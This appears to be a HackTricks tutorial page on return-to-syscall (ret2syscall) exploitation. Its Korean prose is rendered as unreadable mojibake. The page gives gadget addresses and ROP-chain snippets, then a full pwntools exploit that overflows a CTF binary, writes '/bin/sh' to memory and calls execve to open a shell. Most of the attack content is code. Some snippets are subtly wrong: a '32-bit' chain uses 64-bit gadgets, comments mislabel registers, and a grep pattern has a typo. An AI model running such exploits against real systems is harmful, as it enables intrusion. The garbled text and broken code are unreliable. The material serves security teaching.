# Ret2syscall

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ì´ê²ƒì€ Ret2libì™€ ìœ ì‚¬í•˜ì§€ë§Œ, ì´ ê²½ìš°ì—ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ ê²½ìš°, ëª¨ë“  ê²ƒì´ `/bin/sh`ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ëª‡ ê°€ì§€ ì¸ìˆ˜ì™€ í•¨ê»˜ ì‹œìŠ¤í…œ í˜¸ì¶œ `sys_execve`ë¥¼ í˜¸ì¶œí•˜ë„ë¡ ì¤€ë¹„ë©ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ì¼ë°˜ì ìœ¼ë¡œ ì •ì ìœ¼ë¡œ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ì—ì„œ ìˆ˜í–‰ë˜ë¯€ë¡œ ë§ì€ ê°€ì ¯ê³¼ ì‹œìŠ¤í…œ í˜¸ì¶œ ëª…ë ¹ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì‹œìŠ¤í…œ í˜¸ì¶œ**ì„ í˜¸ì¶œí•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì„±ì´ í•„ìš”í•©ë‹ˆë‹¤:

* `rax: 59 sys_execve ì§€ì •`
* `rdi: "/bin/sh"ì— ëŒ€í•œ í¬ì¸í„°, ì‹¤í–‰í•  íŒŒì¼ ì§€ì •`
* `rsi: 0, ì „ë‹¬ëœ ì¸ìˆ˜ ì—†ìŒ ì§€ì •`
* `rdx: 0, ì „ë‹¬ëœ í™˜ê²½ ë³€ìˆ˜ ì—†ìŒ ì§€ì •`

ë”°ë¼ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ë¬¸ìì—´ `/bin/sh`ë¥¼ ì–´ë”˜ê°€ì— ì‘ì„±í•œ ë‹¤ìŒ `syscall`ì„ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤(ìŠ¤íƒì„ ì œì–´í•˜ê¸° ìœ„í•´ í•„ìš”í•œ íŒ¨ë”©ì„ ì¸ì‹í•´ì•¼ í•¨). ì´ë¥¼ ìœ„í•´, ì•Œë ¤ì§„ ì˜ì—­ì— `/bin/sh`ë¥¼ ì“°ê¸° ìœ„í•œ ê°€ì ¯ì´ í•„ìš”í•©ë‹ˆë‹¤.

{% hint style="success" %}
ë˜ ë‹¤ë¥¸ í¥ë¯¸ë¡œìš´ ì‹œìŠ¤í…œ í˜¸ì¶œì€ **`mprotect`**ë¡œ, ì´ëŠ” ê³µê²©ìê°€ **ë©”ëª¨ë¦¬ì˜ í˜ì´ì§€ ê¶Œí•œì„ ìˆ˜ì •í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤**. ì´ëŠ” [ret2shellcode](stack-shellcode.md)ì™€ ê²°í•©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

## Register gadgets

**ì´ ë ˆì§€ìŠ¤í„°ë“¤ì„ ì œì–´í•˜ëŠ” ë°©ë²•**ì„ ì°¾ëŠ” ê²ƒë¶€í„° ì‹œì‘í•©ì‹œë‹¤:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
ì´ ì£¼ì†Œë“¤ì„ ì‚¬ìš©í•˜ì—¬ **ìŠ¤íƒì˜ ë‚´ìš©ì„ ì‘ì„±í•˜ê³  ë ˆì§€ìŠ¤í„°ì— ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

## ë¬¸ìì—´ ì‘ì„±

### ì“°ê¸° ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬

ë¨¼ì € ë©”ëª¨ë¦¬ì—ì„œ ì“°ê¸° ê°€ëŠ¥í•œ ì¥ì†Œë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### ë©”ëª¨ë¦¬ì— ë¬¸ìì—´ ì“°ê¸°

ê·¸ëŸ° ë‹¤ìŒ ì´ ì£¼ì†Œì— ì„ì˜ì˜ ë‚´ìš©ì„ ì“¸ ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.
```bash
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
### ROP ì²´ì¸ ìë™í™”

ë‹¤ìŒ ëª…ë ¹ì€ ì“°ê¸°-ë¬´ì—‡-ì–´ë””ì— ê°€ì ¯ê³¼ ì‹œìŠ¤í…œ í˜¸ì¶œ ëª…ë ¹ì´ ìˆì„ ë•Œ ì •ì  ë°”ì´ë„ˆë¦¬ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì „ì²´ `sys_execve` ROP ì²´ì¸ì„ ìƒì„±í•©ë‹ˆë‹¤:
```bash
ROPgadget --binary vuln --ropchain
```
#### 32 ë¹„íŠ¸
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 ë¹„íŠ¸
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## ë¶€ì¡±í•œ ê°€ì ¯

ê°€ì ¯ì´ **ë¶€ì¡±í•œ ê²½ìš°**, ì˜ˆë¥¼ ë“¤ì–´ ë©”ëª¨ë¦¬ì— `/bin/sh`ë¥¼ ì“°ê¸° ìœ„í•´, **SROP ê¸°ë²•ì„ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  ë ˆì§€ìŠ¤í„° ê°’ì„ ì œì–´**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (RIP ë° íŒŒë¼ë¯¸í„° ë ˆì§€ìŠ¤í„° í¬í•¨):

{% content-ref url="srop-sigreturn-oriented-programming.md" %}
[srop-sigreturn-oriented-programming.md](srop-sigreturn-oriented-programming.md)
{% endcontent-ref %}

ì‚¬ìš©ì ëª¨ë“œì—ì„œ ì»¤ë„ ëª¨ë“œë¡œ ì „í™˜í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” vDSO ì˜ì—­ì— ê°€ì ¯ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ í˜•ì˜ ë„ì „ ê³¼ì œì—ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ vDSO ì˜ì—­ì„ ë¤í”„í•˜ê¸° ìœ„í•´ ì»¤ë„ ì´ë¯¸ì§€ê°€ ì œê³µë©ë‹ˆë‹¤.

## ìµìŠ¤í”Œë¡œì‡ ì˜ˆì œ
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## ë‹¤ë¥¸ ì˜ˆì œ ë° ì°¸ê³ ìë£Œ

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)
* 64ë¹„íŠ¸, PIE ì—†ìŒ, nx, ë©”ëª¨ë¦¬ì— `execve`ë¥¼ í˜¸ì¶œí•˜ê³  ê·¸ê³³ìœ¼ë¡œ ì í”„í•˜ëŠ” ROPë¥¼ ì‘ì„±í•©ë‹ˆë‹¤.
* [https://guyinatuxedo.github.io/07-bof\_static/bkp16\_simplecalc/index.html](https://guyinatuxedo.github.io/07-bof\_static/bkp16\_simplecalc/index.html)
* 64ë¹„íŠ¸, nx, PIE ì—†ìŒ, ë©”ëª¨ë¦¬ì— `execve`ë¥¼ í˜¸ì¶œí•˜ê³  ê·¸ê³³ìœ¼ë¡œ ì í”„í•˜ëŠ” ROPë¥¼ ì‘ì„±í•©ë‹ˆë‹¤. ìŠ¤íƒì— ìˆ˜í•™ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” í•¨ìˆ˜ë¥¼ ì‘ì„±í•˜ê¸° ìœ„í•´ ì•…ìš©ë©ë‹ˆë‹¤.
* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64ë¹„íŠ¸, PIE ì—†ìŒ, nx, BF ì¹´ë‚˜ë¦¬, ë©”ëª¨ë¦¬ì— `execve`ë¥¼ í˜¸ì¶œí•˜ê³  ê·¸ê³³ìœ¼ë¡œ ì í”„í•˜ëŠ” ROPë¥¼ ì‘ì„±í•©ë‹ˆë‹¤.
* [https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/)
* 32ë¹„íŠ¸, ASLR ì—†ìŒ, vDSOë¥¼ ì‚¬ìš©í•˜ì—¬ ROP ê°€ì ¯ì„ ì°¾ê³  `execve`ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
